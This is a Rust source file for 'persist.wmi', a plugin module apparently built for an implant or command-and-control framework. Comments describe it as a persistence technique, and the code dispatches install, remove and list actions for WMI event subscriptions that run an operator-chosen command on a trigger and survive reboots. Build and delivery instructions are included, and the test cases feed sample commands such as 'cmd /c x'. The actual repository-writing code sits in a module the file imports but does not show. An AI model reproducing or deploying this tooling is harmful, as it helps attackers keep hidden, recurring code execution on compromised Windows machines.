//! The persistence family's third module (architecture.md Sec 5.4):
//! `persist.wmi`, the WMI event subscription seat -- one discrete
//! installable and removable technique, the pairing todo.md's family
//! criterion turns on: the verb that installs a seat is the verb that
//! removes it, and both ride the task audit every dispatched action
//! already enters.
//!
//! The grammar gives one verb three actions -- `install` writes the
//! subscription triple (event filter, command-line consumer, binding)
//! under one seat name, `remove` deletes it, `list` reports the bound
//! subscriptions the repository carries (the default: a bare task is a
//! read). Every write needs the administrator's access the repository
//! demands, and the module's refusals say so rather than leaving the
//! elevation fact to be discovered. The seat drops no file of its own:
//! it lives entirely in the on-disk WMI repository, plain to any
//! blue-team reader that enumerates `__FilterToConsumerBinding`, and
//! it fires on its trigger across reboots while it sits.
//!
//! Build for a Windows target (`cargo build --release --target
//! x86_64-pc-windows-gnu`), deliver the cdylib's bytes as a
//! `module.load wmi` task's content, then task `persist.wmi` like any
//! compiled verb. A non-Windows build compiles for the lane and
//! refuses the verb at run time: the technique has no seat to touch
//! there.

mod arguments;
mod subscription;

use arguments::Arguments;
use rod_plugin_sdk::{rod_plugin, Plugin, Verb};

// The action the Windows dispatch matches on; off Windows the verb
// refuses before the name is ever spoken, and an unused import would be
// a build warning the lane turns into a failure.
#[cfg(windows)]
use arguments::Action;

pub struct Wmi;

impl Plugin for Wmi {
    fn name(&self) -> &'static str {
        "wmi"
    }

    fn verbs(&self) -> Vec<Verb> {
        vec![Verb::new("persist.wmi", wmi)]
    }
}

fn wmi(input: &str) -> Result<String, String> {
    let arguments = arguments::parse(input)?;
    arguments::validate(&arguments)?;
    execute(&arguments)
}

/// The Windows execution: the action the task named against the
/// repository.
#[cfg(windows)]
fn execute(arguments: &Arguments) -> Result<String, String> {
    match arguments.action {
        Action::Install => install(arguments),
        Action::Remove => remove(arguments),
        Action::List => list(arguments),
    }
}

/// The technique has no seat off Windows; the manifest's targets keep
/// the module off other loads, and this refusal keeps a stray dispatch
/// honest about why it cannot run.
#[cfg(not(windows))]
fn execute(_arguments: &Arguments) -> Result<String, String> {
    Err(format!(
        "persist.wmi: WMI event subscriptions are a Windows technique; this \
         build runs on {}",
        std::env::consts::OS
    ))
}

#[cfg(windows)]
fn install(arguments: &Arguments) -> Result<String, String> {
    let (name, trigger, command) = (
        arguments.name.as_deref().unwrap_or_default(),
        arguments.trigger.as_deref().unwrap_or_default(),
        arguments.command.as_deref().unwrap_or_default(),
    );
    // The grammar validated the trigger; the builder is pure, so the
    // second read is the same query the repository will store.
    let query = subscription::trigger_query(trigger)?;
    let written = subscription::Session::connect()
        .and_then(|session| session.install_seat(name, &query, command));
    match written {
        Ok(()) => Ok(format!("installed {name}: {query} -> {command}")),
        Err(status) => Err(format!(
            "persist.wmi: {name}: {}",
            subscription::status_message(status)
        )),
    }
}

#[cfg(windows)]
fn remove(arguments: &Arguments) -> Result<String, String> {
    let name = arguments.name.as_deref().unwrap_or_default();
    let removed = subscription::Session::connect().and_then(|session| session.remove_seat(name));
    match removed {
        Ok(parts) => Ok(format!("removed {name} ({})", parts.join(", "))),
        Err(status) => Err(format!(
            "persist.wmi: {name}: {}",
            subscription::status_message(status)
        )),
    }
}

/// The read: every bound subscription in the repository, sorted by
/// seat name so two reads of one host report in the same order. A name
/// riding the task narrows the report to that seat -- the confirmation
/// half of an install the operator just ran.
#[cfg(windows)]
fn list(arguments: &Arguments) -> Result<String, String> {
    let seats = subscription::Session::connect().and_then(|session| session.list_seats());
    match seats {
        Ok(mut seats) => {
            seats.sort_by(|left, right| left.name.cmp(&right.name));
            let rows: Vec<String> = seats
                .iter()
                .filter(|seat| {
                    arguments
                        .name
                        .as_deref()
                        .is_none_or(|wanted| seat.name.eq_ignore_ascii_case(wanted))
                })
                .map(|seat| format!("{}: {} -> {}", seat.name, seat.query, seat.command))
                .collect();
            Ok(if rows.is_empty() {
                match arguments.name.as_deref() {
                    Some(wanted) => format!("no bound subscription named '{wanted}'"),
                    None => "no bound subscriptions in the repository".to_string(),
                }
            } else {
                rows.join("\n")
            })
        }
        Err(status) => Err(format!(
            "persist.wmi: {}",
            subscription::status_message(status)
        )),
    }
}

rod_plugin!(Wmi);

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn an_empty_task_is_the_read() {
        // The default action is list: a bare task reports and writes
        // nothing -- on a non-Windows build it refuses, naming why.
        #[cfg(windows)]
        {
            let output = wmi("").expect("the read runs");
            assert!(output.contains(':'), "{output}");
        }
        #[cfg(not(windows))]
        {
            let refusal = wmi("").expect_err("off Windows the verb refuses");
            assert!(refusal.contains("Windows technique"), "{refusal}");
            assert!(refusal.contains(std::env::consts::OS), "{refusal}");
        }
    }

    #[test]
    fn a_bad_grammar_refuses_before_anything_runs() {
        assert!(wmi("uninstall SeatA").is_err());
        assert!(wmi("install SeatA logon").is_err());
        assert!(wmi("remove SeatA logon cmd /c x").is_err());
        assert!(wmi("list SeatA logon cmd /c x").is_err());
    }
}
